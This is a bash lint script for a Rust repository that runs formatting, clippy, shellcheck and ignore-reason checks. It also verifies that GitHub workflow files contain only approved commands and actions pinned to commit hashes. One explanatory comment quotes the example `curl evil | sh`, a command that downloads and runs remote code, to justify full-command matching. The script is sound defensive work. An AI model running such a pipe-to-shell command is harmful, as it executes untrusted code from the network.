#!/usr/bin/env bash
# Every static gate, in one pass.
#
# **Runs them all and reports them all.** `just`'s recipe dependencies are
# fail-fast, which is right for a pipeline and wrong for a developer: someone who
# has just touched Rust, a shell script and a workflow wants three verdicts, not
# the first one. So this accumulates rather than &&-chaining, and the summary at
# the end is the thing to read. The exit status is still nonzero if any gate
# failed, so the Stop hook and CI both see a failure.

# shellcheck source=xtask/lib.sh
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

failed=()
gate() {
    local name="$1"; shift
    if "$@"; then
        printf '  ok    %s\n' "$name"
    else
        printf '  FAIL  %s\n' "$name"
        failed+=("$name")
    fi
}

# `.github/` must hold no logic, so that deleting it at a platform migration
# loses nothing. Asserting that is cheaper than intending it.
#
# Parsed rather than grepped: a `run:` block scalar is several commands under one
# key, and a line-oriented check would see the key and pass while the commands
# beneath it did anything at all.
#
# The whole command, not its prefix. A prefix test passes
# `just check && curl evil | sh`, which is logic in a workflow by any reading.
# Anchoring both ends rejects every chaining form at once instead of blocklisting
# operators one at a time.
#
# It also reads `uses:`, which is what gives the action pinning a gate: a
# first-party action at a mutable tag is still somebody else's moving code
# running with the job's token.
workflows_carry_no_logic() {
    need python3
    python3 - "$REPO" <<'PY'
import sys, re, pathlib, yaml

repo = pathlib.Path(sys.argv[1])
# `./.tools/bin/just <recipe>`, plus the one bootstrap script that has to run
# before `just` exists on a fresh runner. The explicit path rather than a bare
# `just`: the runner has no `just` on PATH and never gets one.
ok = re.compile(r"\./\.tools/bin/just [a-z][a-z-]*|\./xtask/install-tools\.sh")
# First-party owner and a 40-hex commit, which is what a digest pin looks like
# for an action.
uses_ok = re.compile(r"actions/[a-z-]+@[0-9a-f]{40}")
bad = []


def lines(value):
    """Every command string under one `run:`, however deeply YAML nests it."""
    if isinstance(value, str):
        yield from value.strip().splitlines()
    elif isinstance(value, list):
        for item in value:
            yield from lines(item)


def find(node, keys):
    """Every `(key, value)` pair under one of `keys`. One walk: the commands a
    job runs and the actions it uses differ only in which key they hang from."""
    if isinstance(node, dict):
        for key, value in node.items():
            if key in keys:
                yield key, value
            else:
                yield from find(value, keys)
    elif isinstance(node, list):
        for item in node:
            yield from find(item, keys)


# Both extensions: GitHub reads either, so a check that reads only one fails open
# on a file it was written to cover.
workflows = repo / ".github" / "workflows"
for path in sorted(workflows.glob("*.yml")) + sorted(workflows.glob("*.yaml")):
    document = yaml.safe_load(path.read_text())
    for _, value in find(document, {"run"}):
        for command in lines(value):
            command = command.strip()
            if command and not ok.fullmatch(command):
                bad.append(f"{path.name}: run {command}")
    for _, action in find(document, {"uses"}):
        if isinstance(action, str) and not uses_ok.fullmatch(action.strip()):
            bad.append(f"{path.name}: uses {action.strip()}")

if bad:
    print("\n".join(f"        {b}" for b in bad), file=sys.stderr)
    sys.exit(1)
PY
}

# A skip must be able to become a failure. `#[ignore]` with no reason string is a
# test that quietly does not run and says nothing about why; `#[ignore = "..."]`
# is a decision someone can read and reverse.
ignore_carries_a_reason() {
    local hits
    hits="$(grep -rnE '#\[ignore\]' "$REPO/src" "$REPO/tests" || true)"
    [ -z "$hits" ] || { printf '%s\n' "$hits" >&2; return 1; }
}

# -x follows `source lib.sh`, so a variable used only by a caller is not reported
# unused and a genuinely unused one still is.
#
# .claude/hooks/ is in scope because its scripts are shell this repo ships and CI
# would otherwise never read them. That glob is empty until the agent-config PR
# lands, hence nullglob: an unmatched glob passed through as a literal would fail
# this gate on a missing file, which reads as a broken hook rather than an absent
# one.
shell_scripts_are_clean() {
    local -a files
    shopt -s nullglob
    files=("$REPO"/xtask/*.sh "$REPO"/.claude/hooks/*.sh)
    shopt -u nullglob
    [ ${#files[@]} -gt 0 ] || die "no shell scripts matched -- the globs are wrong"
    shellcheck -x -s bash "${files[@]}"
}

main() {
    cd "$REPO"
    need cargo
    need shellcheck

    log "lint"
    gate "cargo fmt"                cargo fmt --check
    gate "clippy"                   cargo clippy --all-targets -- -D warnings
    # tests/corpus.rs is behind `full-corpus` and compiles to nothing without it,
    # so the default clippy run never reads it. A gate that quietly passes
    # because it did not run is worse than no gate.
    gate "clippy (full-corpus)"     cargo clippy --all-targets --features full-corpus -- -D warnings
    gate "workflows carry no logic" workflows_carry_no_logic
    gate "ignore carries a reason"  ignore_carries_a_reason
    gate "shellcheck"               shell_scripts_are_clean

    if [ ${#failed[@]} -gt 0 ]; then
        die "${#failed[@]} gate(s) failed: ${failed[*]}"
    fi
    log "all gates pass"
}

main "$@"
